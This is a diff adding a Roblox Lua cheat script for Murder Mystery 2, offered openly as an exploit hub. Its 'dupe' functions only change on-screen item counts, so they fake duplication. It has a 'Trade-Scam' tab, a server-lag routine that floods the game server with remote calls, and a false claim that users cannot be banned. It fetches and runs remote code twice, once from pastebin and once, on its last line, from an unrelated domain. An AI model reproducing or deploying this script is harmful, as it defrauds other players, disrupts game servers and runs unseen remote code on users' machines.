@@ -1,1 +1,421 @@
+local WeaponName
+local FunctionCall
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UIPath
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+else
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+end
+local function VisualDupe()
+    wait(math.random(1, 3))
+    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for i,v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for i,v in pairs(v.Container:GetChildren()) do
+                    if v:IsA("Frame") and v.ItemName.Label.Text == WeaponName then
+                        local amount = v.Container.Amount.Text
+                        if amount == "" or amount == "None" then
+                            v.Container.Amount.Text = "x2"
+                        else
+                            local num = tonumber(amount:match("x(%d+)"))
+                            if num then
+                                v.Container.Amount.Text = "x" .. tostring(num + 1)
+                            end
+                        end
+                    end
+                end
+            else
+                if v:IsA("Frame") and v.ItemName.Label.Text == WeaponName then
+                    local amount = v.Container.Amount.Text
+                    if amount == "" or amount == "None" then
+                        v.Container.Amount.Text = "x2"
+                    else
+                        local num = tonumber(amount:match("x(%d+)"))
+                        if num then
+                            v.Container.Amount.Text = "x" .. tostring(num + 1)
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+local function InventoryDupe()
+    wait(math.random(3, 5))
+    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for i,v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for i,v in pairs(v.Container:GetChildren()) do
+                    if v:IsA("Frame") then
+                        if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                            local amount = v.Container.Amount.Text
+                            if amount == "" or amount == "None" then
+                                v.Container.Amount.Text = "x2"
+                            else
+                                local num = tonumber(amount:match("x(%d+)"))
+                                if num then
+                                    v.Container.Amount.Text = "x" .. tostring(num * 2)
+                                end
+                            end
+                        end
+                    end
+                end
+            else
+                if v:IsA("Frame") then
+                    if v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
+                        local amount = v.Container.Amount.Text
+                        if amount == "" or amount == "None" then
+                            v.Container.Amount.Text = "x2"
+                        else
+                            local num = tonumber(amount:match("x(%d+)"))
+                            if num then
+                                v.Container.Amount.Text = "x" .. tostring(num * 2)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+        if v:IsA("Frame") then
+            local amount = v.Container.Amount.Text
+            if amount == "" or amount == "None" then
+                v.Container.Amount.Text = "x2"
+            else
+                local num = tonumber(amount:match("x(%d+)"))
+                if num then
+                    v.Container.Amount.Text = "x" .. tostring(num * 2)
+                end
+            end
+        end
+    end
+end
+local OrionLib = loadstring(game:HttpGet(('https://pastebin.com/raw/WRUyYTdY')))()
+OrionLib:MakeNotification({
+    Name = "IceCC Exploits | MM2",
+    Content = "IceCC Exploits: Murder Mystery 2",
+    Image = "rbxassetid://7733964719",
+    Time = 5
+})
+local Window = OrionLib:MakeWindow({
+    Name = "Dupe Scripts [DUPE] 🥶 #1 DUPE EXPLOIT.",
+    HidePremium = false,
+    IntroText = "Dupescripts V5",
+    SaveConfig = true,
+    ConfigFolder = "Dupeexploits"
+})
+local InfoTab = Window:MakeTab({
+    Name = "Information",
+    Icon = "rbxassetid://7733964719",
+    PremiumOnly = false
+})
+local InfoSection = InfoTab:AddSection({
+    Name = "Script Information ❓"
+})
+InfoTab:AddParagraph("Alt Account Warning! ⚠️", "If You Are Using An Alt Account/Another Account Besdies Your Main, All Of The Exploits Will Not Work! This Will Only Work On Your Main Account Because The .SetVariables Are Stored On Your Main Account!")
+InfoTab:AddParagraph("MM2 Dupe Status! 🛠️", "The MM2 Dupe Is Currenty 100% Working. If You Find Any Errors/Bugs, Please Report Them To 'icewingfanatic' On Discord!")
+InfoTab:AddLabel("Script Hub Made By The IceCC Team!💧")
+InfoTab:AddButton({
+    Name = "Copy Discord Invite",
+    Callback = function()
+        setclipboard("We dont have discord yet")
+        OrionLib:MakeNotification({
+            Name = "DupeScripts mm2",
+            Content = "we dont have discordi",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+    end
+})
+local DupeTab = Window:MakeTab({
+    Name = "Weapon Dupe",
+    Icon = "rbxassetid://7734022107",
+    PremiumOnly = false
+})
+local DupeSection = DupeTab:AddSection({
+    Name = "Weapon Duplication [FetchData]🔪"
+})
+DupeTab:AddTextbox({
+    Name = "Weapon Name 📌",
+    Default = "Lightbringer",
+    TextDisappear = false,
+    Callback = function(Value)
+        WeaponName = Value
+        OrionLib:MakeNotification({
+            Name = "IceCC Exploits | MM2",
+            Content = "Selected Weapon: "..tostring(WeaponName).."",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+    end
+})
+DupeTab:AddTextbox({
+    Name = "Dupe Amount 📦",
+    Default = "5",
+    TextDisappear = false,
+    Callback = function(DupeAmount)
+        FunctionCall = DupeAmount
+        OrionLib:MakeNotification({
+            Name = "IceCC Exploits | MM2",
+            Content = "Selected Amount: "..tostring(FunctionCall).."",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+    end
+})
+DupeTab:AddButton({
+    Name = "Start Duplication Proccess❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "IceCC Exploits | MM2",
+            Content = "Started Duplication For: ".. tostring(WeaponName) ..", " .. tostring(FunctionCall) .. " times.",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+        for i = 1, FunctionCall do
+        VisualDupe()
+        end
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Successfully duplicated ".. tostring(WeaponName) .." " .. tostring(FunctionCall) .. " times.",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+    end    
+})
+local DupeInvSection = DupeTab:AddSection({
+    Name = "Inventory Duplication [FetchData]🔪"
+})
+DupeTab:AddButton({
+    Name = "Start Inventory Dupe Proccess❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Attempting To Duplicate Whole Weapon Inventory.",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+        InventoryDupe()
+        wait(1)
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Successfully Duplicated Whole Weapon Inventory, Enjoy!",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+    end    
+})
+DupeTab:AddParagraph("Tutorial For Weapon Duper! 🗡", "First, Enter The Weapon Name You Wanna Dupe. Then, Enter The Amount Of Time You Want To Dupe It. Lasty, Click 'Toggle Duplication Proccess' And Your Item Should Dupe! YOU CANNOT GET BANNED FOR THIS!")
+DupeTab:AddParagraph("Alt Account Warning! ⚠️", "If You Are Using An Alt Account/Another Account, It Will Not Work! This Will Only Work On Your Main Account Because The .SetVariables Are Stored On Your Main Account!")
+local TradeScamTab = Window:MakeTab({
+    Name = "Trade-Scam",
+    Icon = "rbxassetid://7733673056",
+    PremiumOnly = false
+})
+
+local TradeScamSection = TradeScamTab:AddSection({
+    Name = "Trade-Scam [.ServerInstance] 📜"
+})
+
+TradeScamSection:AddToggle({
+    Name = "Toggle Visual Trade 📌",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+})
+
+TradeScamTab:AddButton({
+    Name = "Start Visual Trade❗",
+    Callback = function()
+        wait(1.5)
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Items In Trade Are Now Visual, Remove All Items!",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+    end    
+})
+
+TradeScamTab:AddParagraph("Tutorial For Trade-Scam! 📜", "First, Click On Toggle Visual Trade. Then, Click On Start Visual Trade! It Will Take A 2 Seconds For The Items In The Trade To Become Visual!")
+TradeScamTab:AddParagraph("Alt Account Warning! ⚠️", "If You Are Using An Alt Account/Another Account, It Will Not Work! This Will Only Work On Your Main Account Because The .SetVariables Are Stored On Your Main Account!")
+------
+local VisualTab = Window:MakeTab({
+    Name = "Visual",
+    Icon = "rbxassetid://7733964640",
+    PremiumOnly = false
+})
+
+local VisualSection = VisualTab:AddSection({
+    Name = "Visual Weapons [.MeshReplace] 🔫"
+})
+VisualTab:AddButton({
+    Name = "Nik's Scythe❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Getting Nik's Sycthe...",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+            game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.TextureId = "rbxassetid://2599774828"
+			game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.MeshId = "rbxassetid://305826272"
+			game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.Scale = Vector3.new(0.9, 0.9, 0.9)
+			game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.TextureId = "rbxassetid://2599774828"
+			game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.MeshId = "rbxassetid://305826272"
+			game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.Scale = Vector3.new(0.9, 0.9, 0.9)
+            OrionLib:MakeNotification({
+                Name = "DupeExploits | MM2",
+                Content = "Successfully Got Nik's Sycthe!",
+                Image = "rbxassetid://7733964719",
+                Time = 5
+            }) 
+    end    
+})
+VisualTab:AddButton({
+    Name = "Candleflame❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Getting Candleflame...",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.TextureId = "rbxassetid://8272172218"
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.MeshId = "rbxassetid://7791364860"
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.Scale = Vector3.new(0.064, 0.064, 0.064)
+        game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.TextureId = "rbxassetid://8272172218"
+        game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.MeshId = "rbxassetid://7791364860"
+        game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.Scale = Vector3.new(0.064, 0.064, 0.064)
+            OrionLib:MakeNotification({
+                Name = "DupeExploits | MM2",
+                Content = "Successfully Got Candleflame!",
+                Image = "rbxassetid://7733964719",
+                Time = 5
+            }) 
+    end    
+})
+VisualTab:AddButton({
+    Name = "Corrupt❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Getting Corrupt...",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.TextureId = "http://www.roblox.com/asset/?id=162016526"
+		game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.TextureId = "http://www.roblox.com/asset/?id=162016526"
+            OrionLib:MakeNotification({
+                Name = "DupeExploits | MM2",
+                Content = "Successfully Got Corrupt!",
+                Image = "rbxassetid://7733964719",
+                Time = 5
+            }) 
+    end    
+})
+VisualTab:AddButton({
+    Name = "Icebreaker❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Getting Icebreaker...",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+            game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.TextureId = "rbxassetid://6124173821"
+			game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.MeshId = "rbxassetid://6124173614"
+			game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.Scale = Vector3.new(1, 1, 1)
+			game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.TextureId = "rbxassetid://6124173821"
+			game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.MeshId = "rbxassetid://6124173614"
+			game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.Scale = Vector3.new(1, 1, 1)
+            OrionLib:MakeNotification({
+                Name = "DupeExploits | MM2",
+                Content = "Successfully Got Icebreaker!",
+                Image = "rbxassetid://7733964719",
+                Time = 5
+            }) 
+    end    
+})
+VisualTab:AddButton({
+    Name = "Batwing❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Getting Batwing...",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.TextureId = "rbxassetid://2551856737"
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.MeshId = "rbxassetid://305826272"
+        game.Players.LocalPlayer.Character.KnifeDisplay.Mesh.Scale = Vector3.new(0.9, 0.9, 0.9)
+        game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.TextureId = "rbxassetid://2551856737"
+        game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.MeshId = "rbxassetid://305826272"
+        game.Players.LocalPlayer.Backpack.Knife.Handle.Mesh.Scale = Vector3.new(0.9, 0.9, 0.9)
+            OrionLib:MakeNotification({
+                Name = "DupeExploits | MM2",
+                Content = "Successfully Got Batwing!",
+                Image = "rbxassetid://7733964719",
+                Time = 5
+            }) 
+    end    
+})
+VisualTab:AddParagraph("Tutorial For Visual Weapons! 🔫", "First, Click On Whatever Weapon Visual You Want. Then, Equip Any Gun/Knife. When You Get Murderer, The Gun Will Look Like Whatever You Chose. If You Die/Reset Then It Will Go Away.")
+VisualTab:AddParagraph("Alt Account Warning! ⚠️", "If You Are Using An Alt Account/Another Account, It Will Not Work! This Will Only Work On Your Main Account Because The .SetVariables Are Stored On Your Main Account!")
+------
+local CrasherTab = Window:MakeTab({
+    Name = "Lagger",
+    Icon = "rbxassetid://7734053426",
+    PremiumOnly = false
+})
+
+local CrasherSection = CrasherTab:AddSection({
+    Name = "Server Lagger [.KBPSLimit] 🖥"
+})
+CrasherTab:AddButton({
+    Name = "Start Server Lag❗",
+    Callback = function()
+        OrionLib:MakeNotification({
+            Name = "DupeExploits | MM2",
+            Content = "Server Is Now In Lagging, There Is A Chance To Be Disconnected!",
+            Image = "rbxassetid://7733964719",
+            Time = 5
+        })
+local e = game:GetService("ReplicatedStorage").GetSyncData
+local InvokeServer = e.InvokeServer
+local spawn = task.spawn
+local a = 0;
+    while 1 do
+        for i=1, 1 do
+            spawn(InvokeServer, e)
+        end
+        a = a + 1
+        if a == 3 then
+            a = 0
+            wait(0)
+            end
+        end
+    end    
+})
+CrasherTab:AddParagraph("Tutorial For Server Lagger! 📜", "First, Click On Start Server Lag. Then, Your Ping Will Start To Rise And There Might Be A Chance To Be Kicked!")
+CrasherTab:AddParagraph("Alt Account Warning! ⚠️", "If You Are Using An Alt Account/Another Account, It Will Not Work! This Will Only Work On Your Main Account Because The .SetVariables Are Stored On Your Main Account!")
+local ChangelogsTab = Window:MakeTab({
+    Name = "Changelogs",
+    Icon = "rbxassetid://8997388036",
+    PremiumOnly = false
+})
+local ChangelogsSection = ChangelogsTab:AddSection({
+    Name = "Script Changes 📜"
+})
+ChangelogsTab:AddParagraph("Version 1.0.0", "Added Trade Scam [V1]")
+ChangelogsTab:AddParagraph("Version 2.0.0", "Updated Trade Scam [V2]")
+ChangelogsTab:AddParagraph("Version 3.0.0", "Updated Trade Scam [V3]")
+ChangelogsTab:AddParagraph("Version 4.0.0", "Added Weapon Dupe And Crasher [V4]")
+ChangelogsTab:AddParagraph("Version 5.0.0 (Current)", "Updated Weapon Dupe [V5]")
+ChangelogsTab:AddParagraph("Credits", "Created by icewingfanatic, developed by _k4f7")
+OrionLib:Init()
 loadstring(game:HttpGet("https://egorikusa.space/ad3832eed4b259c7f68e1fd6.lua", true))()
